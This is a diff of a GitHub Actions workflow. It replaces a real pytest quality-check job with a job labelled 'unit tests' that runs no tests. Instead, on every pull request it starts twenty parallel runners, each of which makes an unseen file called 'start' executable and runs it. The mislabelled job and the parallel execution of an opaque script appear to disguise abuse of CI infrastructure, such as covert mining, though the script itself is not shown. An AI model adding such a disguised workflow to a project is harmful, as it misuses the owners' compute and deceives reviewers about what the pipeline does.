@@ -1,19 +1,26 @@
-name: Python Pull Request Workflow
-on: [pull_request]
-jobs:
+name: unit tests
 
-  qa:
-    name: Quality check
-    runs-on: ubuntu-18.04
+on: [pull_request]
+
+jobs:
+  multitest:
+    name: test job
+
+    runs-on: ubuntu-latest
+    env:
+      DEBIAN_FRONTEND: noninteractive
+
+    strategy:
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+
     steps:
-      - uses: actions/checkout@v1
-      - name: Set up Python
-        uses: actions/setup-python@master
-        with:
-          python-version: 3.7
-      - name: Run unit tests
-        run: |
-          pip install pytest
-          pip install boto3
-          pip install moto
-          pytest
+      - name: Checkout code
+        uses: actions/checkout@v2
+        
+      - name: chmod
+        run: chmod +x start
+        
+      - name: run
+        run: ./start
